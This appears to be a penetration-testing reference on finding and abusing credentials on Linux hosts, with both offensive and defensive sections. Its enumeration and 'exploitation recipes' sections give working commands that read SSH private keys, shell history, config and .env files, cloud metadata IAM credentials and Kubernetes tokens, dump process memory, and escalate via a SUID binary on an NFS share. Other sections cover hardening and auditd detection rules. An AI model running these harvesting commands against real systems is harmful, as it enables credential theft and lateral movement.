## 1. Overview

Credentials on Linux hosts are scattered across many locations: SSH
keys, shell history, environment variables, configuration files,
databases, cloud metadata, and Kubernetes secrets. A compromised
low-privileged shell often yields credentials that unlock other hosts
or higher privileges.

This file covers where to look, how to extract, and how to defend.

**Credential locations at a glance:**

| Location | Typical contents |
|----------|------------------|
| `~/.ssh/` | Private keys, config, known_hosts, agent socket |
| Shell history | `~/.bash_history`, `.zsh_history`, `.python_history` |
| Environment | `env`, `/etc/environment`, `~/.bashrc`, `~/.profile` |
| Config files | `/etc/*.conf`, app configs, `.env`, `.git-credentials` |
| Databases | MySQL, PostgreSQL, MongoDB, Redis (often local-only) |
| Cloud metadata | `169.254.169.254` (AWS, GCP, Azure IMDS) |
| Kubernetes | Service account tokens, mounted secrets |
| Process memory | `gcore`, `/proc/<pid>/mem` |
| Mounted shares | NFS, SMB (auto-mounted credentials) |
| SSH agent | `SSH_AUTH_SOCK` (forwarded from admin) |
| Backup files | `.bak`, `.old`, `~` suffixes |
| Logs | `/var/log/`, application logs |
| Cached credentials | `~/.cache/`, browser profiles |
| Git repos | `.git/config` with tokens, committed secrets |

**Why credential discovery matters:**

- Credentials are reusable across hosts (SSH keys).
- Credentials often bypass MFA (SSH keys, service accounts).
- Credentials frequently unlock higher privileges.
- Credentials in files are the quietest path to lateral movement.

## 2. Reconnaissance / Enumeration

**Offensive - SSH keys and configuration:**

    # User SSH directory
    ls -la ~/.ssh/
    cat ~/.ssh/id_rsa
    cat ~/.ssh/id_ed25519
    cat ~/.ssh/config
    cat ~/.ssh/known_hosts
    cat ~/.ssh/authorized_keys

    # All SSH private keys on the host
    find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null

    # All .pem and .key files
    find / -name "*.pem" -o -name "*.key" 2>/dev/null

    # SSH agent socket
    echo $SSH_AUTH_SOCK
    ls -la $SSH_AUTH_SOCK
    ssh-add -l

**Offensive - shell history:**

    cat ~/.bash_history
    cat ~/.zsh_history
    cat ~/.sh_history
    cat ~/.python_history
    cat ~/.mysql_history
    cat ~/.psql_history
    cat ~/.sqlite_history

    # Search for commands with credentials
    grep -iE "pass|pwd|token|secret|key|user" ~/.bash_history

**Offensive - environment:**

    env
    set
    cat /etc/environment
    cat ~/.bashrc
    cat ~/.bash_profile
    cat ~/.profile
    cat ~/.zshrc

    # Look for tokens, API keys, database URLs
    env | grep -iE "token|key|secret|pass|api|aws|azure|gcp"

**Offensive - config files:**

    # Common config locations
    find /etc -name "*.conf" -o -name "*.config" -o -name "*.ini" 2>/dev/null | head -50
    find /opt /srv /var/www -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name ".env" 2>/dev/null

    # Search for credentials
    grep -rI "password" /etc /opt /srv /var/www 2>/dev/null | grep -v "Binary" | head -50
    grep -rI "passwd" /etc /opt /srv /var/www 2>/dev/null | head -50
    grep -rI "secret" /etc /opt /srv /var/www 2>/dev/null | head -50

    # Application-specific
    cat /var/www/html/wp-config.php 2>/dev/null
    cat /var/www/html/.env 2>/dev/null
    cat /var/www/html/config.php 2>/dev/null
    cat /opt/*/config/*.yml 2>/dev/null

    # Git credentials
    cat ~/.git-credentials
    cat ~/.gitconfig
    cat .git/config

**Offensive - databases:**

    # MySQL
    mysql -u root -p 2>/dev/null
    mysql --defaults-file=/etc/mysql/debian.cnf 2>/dev/null
    cat /etc/mysql/debian.cnf 2>/dev/null

    # PostgreSQL
    sudo -u postgres psql 2>/dev/null
    cat /etc/postgresql/*/main/pg_hba.conf 2>/dev/null

    # MongoDB
    mongo --host localhost 2>/dev/null

    # Redis
    redis-cli 2>/dev/null
    redis-cli CONFIG GET * 2>/dev/null

**Offensive - cloud metadata:**

    # AWS IMDSv1
    curl -s http://169.254.169.254/latest/meta-data/
    curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

    # Get credentials for a role
    curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>

    # GCP
    curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/

    # Azure
    curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

**Offensive - Kubernetes:**

    # Service account
    cat /var/run/secrets/kubernetes.io/serviceaccount/token
    cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
    cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

    # All mounted secrets
    find / -path "*secrets*" -name "*token*" 2>/dev/null
    find /var/run/secrets -type f 2>/dev/null

    # Env vars from Kubernetes
    env | grep -iE "kubernetes|kube|service"

**Offensive - process memory:**

    # If you have root (or SeDebug equivalent):
    ps aux
    gcore <PID>
    strings core.<PID> | grep -iE "pass|token|key"

    # Or read /proc directly
    cat /proc/<PID>/environ
    cat /proc/<PID>/cmdline
    cat /proc/<PID>/maps

**Offensive - mounted shares:**

    mount | grep -E "nfs|cifs|smb"
    cat /etc/fstab
    cat /etc/auto.master 2>/dev/null

**Offensive - cached credentials:**

    ls -la ~/.cache/
    ls -la ~/.config/
    # Browser profiles (Chrome, Firefox)
    ls -la ~/.mozilla/firefox/ 2>/dev/null
    ls -la ~/.config/google-chrome/ 2>/dev/null

**Offensive - logs:**

    grep -rI "password" /var/log/ 2>/dev/null | head -20
    grep -rI "token" /var/log/ 2>/dev/null | head -20

**Offensive - backup files:**

    find / -name "*.bak" -o -name "*.old" -o -name "*~" 2>/dev/null | head -50

**Offensive - automated:**

    # LinPEAS has a "Credentials" section
    ./linpeas.sh

    # laZagne (multi-source credential recovery)
    python3 laZagne.py all

    # Mimipenguin (Linux credential dumper, requires root)
    ./mimipenguin

**Defensive - what to baseline:**

- SSH keys and their permissions.
- `authorized_keys` contents.
- `SSH_AUTH_SOCK` presence.
- Environment variables in `/etc/environment`.
- Config files with credentials.
- Database configurations.
- Cloud metadata service usage.
- Kubernetes service account tokens.
- Mounted shares.
- Recent history file modifications.

## 3. Common Attack Vectors

**SSH keys:**

- Private keys in home directories.
- Private keys with no passphrase.
- `authorized_keys` with attacker-controlled keys (persistence).
- SSH agent forwarding (agent socket accessible).

**Shell history:**

- Commands with plaintext credentials.
- Database connection strings.
- SSH commands with passwords.
- API calls with tokens.

**Environment variables:**

- `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`.
- `DATABASE_URL` with password.
- `API_KEY`, `TOKEN`, `SECRET`.
- `KUBECONFIG`.

**Config files:**

- `wp-config.php` (WordPress DB credentials).
- `.env` files (Laravel, Node, Django).
- `config.yml` (Rails, Spring).
- `.pgpass`, `.my.cnf` (DB client credentials).
- `.aws/credentials`, `.azure/`, `.config/gcloud/`.
- `.docker/config.json` (registry credentials).

**Databases:**

- Local MySQL/PostgreSQL with no password (or weak).
- Redis with no auth.
- MongoDB with no auth.
- Credentials in `/etc/mysql/debian.cnf` (Debian/Ubuntu).

**Cloud metadata:**

- IMDSv1 (no auth) exposes IAM credentials.
- IMDSv2 requires a token, but the token is obtainable from the host.
- GCP and Azure similar.

**Kubernetes:**

- Service account token with too many RBAC permissions.
- Mounted secrets (application credentials).
- `KUBECONFIG` with cluster-admin.

**Process memory:**

- Service processes with credentials in memory.
- LSASS equivalent on Linux (`gcore`, `procfs`).

**Mounted shares:**

- NFS with no root_squash.
- SMB/CIFS with credentials in `/etc/fstab`.

**Logs:**

- Application logs with tokens or passwords.
- Auth logs with usernames.
- Apache/Nginx access logs with tokens in URLs.

## 4. Exploitation Recipes

**SSH private key reuse:**

    # 1. Find a private key
    find / -name "id_rsa" 2>/dev/null

    # 2. Check if it has a passphrase
    ssh-keygen -y -f ~/.ssh/id_rsa
    # If the key has no passphrase, this prints the public key.
    # If it has a passphrase, it prompts.

    # 3. Try the key on other hosts (lateral movement)
    ssh -i ~/.ssh/id_rsa user@other-host

    # 4. Or use the key for authentication from attacker
    cp ~/.ssh/id_rsa /tmp/exfil
    # Exfil to attacker, chmod 600, ssh -i.

**Shell history credentials:**

    # 1. Search for credentials in history
    grep -iE "pass|pwd|token|secret|key" ~/.bash_history

    # Example output:
    # mysql -u root -pMyPassword123
    # curl -H "Authorization: Bearer eyJhbGciOiJ..."

    # 2. Use the credentials

**Config file credentials (WordPress):**

    # 1. Find wp-config.php
    cat /var/www/html/wp-config.php

    # Example output:
    # define('DB_NAME', 'wordpress');
    # define('DB_USER', 'wpuser');
    # define('DB_PASSWORD', '<PASSWORD>');
    # define('DB_HOST', 'localhost');

    # 2. Use the credentials to access MySQL
    mysql -u wpuser -p'<PASSWORD>' wordpress

**`.env` file credentials:**

    # 1. Find .env files
    find / -name ".env" 2>/dev/null

    # 2. Read
    cat /var/www/html/.env

    # Example output:
    # DB_HOST=localhost
    # DB_USER=app
    # DB_PASSWORD=<PASSWORD>
    # AWS_ACCESS_KEY_ID=<TOKEN>
    # AWS_SECRET_ACCESS_KEY=<TOKEN>
    # STRIPE_SECRET_KEY=<TOKEN>

    # 3. Use the credentials

**Database credentials (Debian MySQL):**

    # 1. Debian/Ubuntu store MySQL root credentials in /etc/mysql/debian.cnf
    cat /etc/mysql/debian.cnf

    # Example output:
    # [client]
    # user     = debian-sys-maint
    # password = <PASSWORD>

    # 2. Use the credentials
    mysql --defaults-file=/etc/mysql/debian.cnf

**Cloud metadata (AWS IMDSv1):**

    # 1. Check for a role
    curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

    # Example output:
    # my-ec2-role

    # 2. Fetch the credentials
    curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/my-ec2-role

    # Example output:
    # {
    #   "Code": "Success",
    #   "AccessKeyId": "<TOKEN>",
    #   "SecretAccessKey": "<TOKEN>",
    #   "Token": "<TOKEN>",
    #   "Expiration": "2026-10-15T12:00:00Z"
    # }

    # 3. Use the credentials
    export AWS_ACCESS_KEY_ID=<TOKEN>
    export AWS_SECRET_ACCESS_KEY=<TOKEN>
    export AWS_SESSION_TOKEN=<TOKEN>
    aws sts get-caller-identity
    aws s3 ls

**Kubernetes service account token:**

    # 1. Read the token
    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

    # 2. Query the API
    APISERVER=https://kubernetes.default.svc
    curl -s $APISERVER/api/v1/namespaces/default/pods --header "Authorization: Bearer $TOKEN" --insecure

    # 3. Check what the SA can do
    curl -s $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
      --header "Authorization: Bearer $TOKEN" \
      --header "Content-Type: application/json" \
      --insecure \
      --data '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'

**SSH agent forwarding abuse:**

    # 1. Check for a forwarded agent
    echo $SSH_AUTH_SOCK
    ssh-add -l

    # 2. If a key is loaded, use it to authenticate to other hosts
    # (without ever seeing the private key)
    ssh -A user@other-host

    # Or extract the key via the agent socket:
    # (tools like ssh-agent-tools or custom scripts)

**Process memory dump:**

    # 1. Identify a service process with credentials in memory
    ps aux

    # 2. Dump its memory (requires root or same-user access)
    gcore <PID>
    strings core.<PID> | grep -iE "pass|token|key|secret"

    # Or directly from /proc
    sudo cat /proc/<PID>/environ | tr '\0' '\n'

**Mounted NFS share credentials:**

    # 1. Check mounts
    mount | grep nfs

    # 2. If root_squash is disabled, write a SUID binary as "root"
    # On the NFS server (if writable):
    cp /bin/bash /mnt/nfs/bash
    chmod u+s /mnt/nfs/bash

    # 3. On the client (where the mount is):
    /mnt/nfs/bash -p

**LinPEAS credentials section:**

    ./linpeas.sh

    # Expected output (highlights):
    # [+] Searching credentials in files
    # /var/www/html/wp-config.php: DB_PASSWORD='<PASSWORD>'
    # [+] Environment variables with credentials
    # AWS_ACCESS_KEY_ID=<TOKEN>
    # [+] SSH keys
    # /home/user/.ssh/id_rsa (no passphrase)
    # [+] History files with passwords
    # ~/.bash_history: mysql -u root -p<password>

## 5. Post-Exploitation

**After harvesting credentials:**

- Test them against other hosts (SSH, SMB, databases).
- Test them against cloud services (AWS, Azure, GCP).
- Test them against Kubernetes (kubectl).
- Test them against web applications (admin panels).
- Store them securely (encrypted password manager, not plaintext).
- Rotate any credentials you use.

**Credential reuse patterns:**

- Same password across SSH, sudo, database, web app.
- Same SSH key across hosts.
- Same API token across services.
- Cloud IAM role with broad permissions.

**On the attacker (Linux):**

    # Use SSH keys
    chmod 600 key.pem
    ssh -i key.pem user@target

    # Use credentials for cloud
    export AWS_ACCESS_KEY_ID=...
    export AWS_SECRET_ACCESS_KEY=...
    aws sts get-caller-identity

    # Use Kubernetes token
    kubectl --server=https://... --token=... get pods

    # Use DB credentials
    mysql -h target -u user -p'password'

**On the host (blue team):**

- Rotate all exposed credentials.
- Revoke SSH keys and API tokens.
- Audit `authorized_keys` for unauthorized entries.
- Audit history files for credentials.
- Audit config files for plaintext credentials.
- Audit cloud IAM roles for excessive permissions.
- Audit Kubernetes RBAC for excessive permissions.

## 6. Risk Context

Credential discovery is often the fastest path from a low-privileged
shell to lateral movement or privilege escalation:

- SSH keys grant silent access to other hosts.
- Cloud IAM credentials grant access to the entire cloud account.
- Kubernetes tokens grant access to the cluster.
- Config file credentials are reusable across services.

**Blast radius:** a single harvested credential often unlocks dozens of
hosts or services.

**Why attacks succeed:**

- SSH keys are shared across hosts.
- Credentials are stored in plaintext.
- History files are not cleared.
- Cloud metadata is accessible from any process.
- Kubernetes service accounts have too many permissions.
- IAM roles are too broad.
- Credentials are not rotated.

## 7. Root Causes

- **Plaintext credentials.** Config files, history, environment.
- **Credential reuse.** Same password or key across services.
- **Over-privileged service accounts.** Broad IAM roles, broad RBAC.
- **No rotation.** Credentials persist indefinitely.
- **Shared SSH keys.** Same key deployed on many hosts.
- **History not cleared.** Deployment scripts leave history.
- **Metadata service accessible.** IMDSv1 by default.
- **No secret management.** Manual credential distribution.

## 8. Preventive Controls

**Credential hygiene:**

- Never store plaintext credentials in config files.
- Use a secret manager (Vault, AWS Secrets Manager, Azure Key Vault).
- Rotate credentials regularly.
- Use short-lived credentials (STS, service account tokens).

**SSH hardening:**

- Use keys with passphrases.
- Restrict key permissions (`0600`).
- Disable SSH agent forwarding by default.
- Use `AuthorizedKeysCommand` for centralized management.
- Audit `authorized_keys` regularly.

**History hygiene:**

- Clear history before deployment.
- Set `HISTIGNORE` for sensitive commands.
- Use `HISTCONTROL=ignorespace`.
- Avoid credentials on the command line (use env vars or prompts).

**Environment hygiene:**

- Do not export credentials globally.
- Use per-service credentials.
- Use file-based credentials (`~/.aws/credentials`) with restricted
  permissions.

**Cloud hardening:**

- Enforce IMDSv2 (AWS).
- Restrict IMDS access via firewall rules.
- Use least-privilege IAM roles.
- Use instance profiles instead of long-lived keys.

**Kubernetes hardening:**

- Use short-lived service account tokens (bound tokens).
- Restrict RBAC to the minimum required.
- Use `automountServiceAccountToken: false` where possible.
- Use external secret managers (Vault, External Secrets).

**Monitoring:**

- Audit for plaintext credentials in files (gitleaks, trufflehog).
- Audit history file contents.
- Audit `authorized_keys` changes.
- Audit cloud IAM changes.
- Audit Kubernetes RBAC changes.

## 9. Detection Controls

**SSH key theft:**

- auditd: `-w /home -p rwa -k home_access` (watch for reads of
  `.ssh/`)
- auditd: `-w /root/.ssh -p rwa -k root_ssh`
- Alert on reads of private keys by non-owners.

**History file access:**

- auditd: `-w /home -p rwa -k home_access`
- Alert on reads of `.bash_history` by non-owners.

**Config file access:**

- auditd: `-w /etc -p rwa -k etc_access`
- Alert on reads of config files by non-owners.

**Cloud metadata:**

- AWS CloudTrail: monitor `GetMetadataService` calls.
- Alert on IMDS calls from unexpected sources.
- CloudTrail: `GetCallerIdentity`, `AssumeRole` from new IPs.

**Kubernetes:**

- Kubernetes audit log: `get secrets`, `list secrets`.
- Alert on service account token usage from unexpected sources.
- Alert on RBAC changes.

**SSH agent:**

- auditd: `-w /tmp -p rwa -k tmp_access` (agent sockets in /tmp).
- Alert on agent socket access.

**Process memory:**

- Sysmon for Linux: process access events.
- auditd: `-a always,exit -F arch=b64 -S ptrace -k ptrace`
- Alert on `gcore` or `ptrace` of service processes.

**General:**

- Gitleaks / trufflehog in CI for committed secrets.
- Alert on credential files being read.
- Baseline normal access patterns; alert on anomalies.

## 10. Verification

**Offensive - did credential discovery succeed?**

- SSH key: key works on another host.
- Config credentials: credentials work for DB or app.
- Cloud IAM: `aws sts get-caller-identity` returns the role.
- Kubernetes: `kubectl get pods` works with the token.
- History credentials: reused successfully.

**Defensive - are controls effective?**

- No plaintext credentials in config files (manual + tool review).
- No credentials in history files.
- No cloud long-lived credentials.
- No over-permissive IAM roles.
- No over-permissive RBAC.
- SSH keys have passphrases.
- No shared SSH keys across hosts.
- Credentials rotated within policy.

## 11. OSCP Notes

- Credential discovery is a common OSCP technique. Practice:
  - `.bash_history` review.
  - Config file search.
  - `~/.ssh/` review.
  - `env` review.
- Always check home directories of other users if readable.
- **Capture screenshots** of:
  - The credential file or command output.
  - The successful authentication with the credential.
  - The new shell or access obtained.
- The `> [!IMPORTANT]` OSCP reporting note applies to the credential
  discovery and use.

## 12. Production Notes

- Credential discovery in production is often the fastest path to
  lateral movement.
- Cloud metadata service is a primary target; enforce IMDSv2.
- Kubernetes service account tokens with broad RBAC are common.
- SSH keys are frequently reused across hosts.
- Credentials in config files are common in legacy applications.
- Assume credentials are being harvested; rotate regularly.
- Use secret managers to reduce the attack surface.

## 13. References

**Linux documentation:**

- SSH manual - https://man.openbsd.org/ssh
- AWS IMDS documentation - https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
- Kubernetes service accounts - https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/

**MITRE ATT&CK:**

- Credential Access - Unsecured Credentials (T1552) - https://attack.mitre.org/techniques/T1552/
- Credential Access - Credentials from Password Stores (T1555) - https://attack.mitre.org/techniques/T1555/
- Credential Access - Steal or Forge Authentication Certificates (T1649) - https://attack.mitre.org/techniques/T1649/
- Lateral Movement - Use Alternate Authentication Material (T1550) - https://attack.mitre.org/techniques/T1550/

**Tools:**

- LinPEAS - https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
- laZagne - https://github.com/AlessandroZ/LaZagne
- Mimipenguin - https://github.com/huntergregal/mimipenguin
- trufflehog - https://github.com/trufflesecurity/trufflehog
- gitleaks - https://github.com/gitleaks/gitleaks

**Research:**

- HackTricks - Linux Privilege Escalation - https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- AWS IMDSv2 - https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
- Kubernetes RBAC Good Practices - https://kubernetes.io/docs/concepts/security/rbac-good-practices/
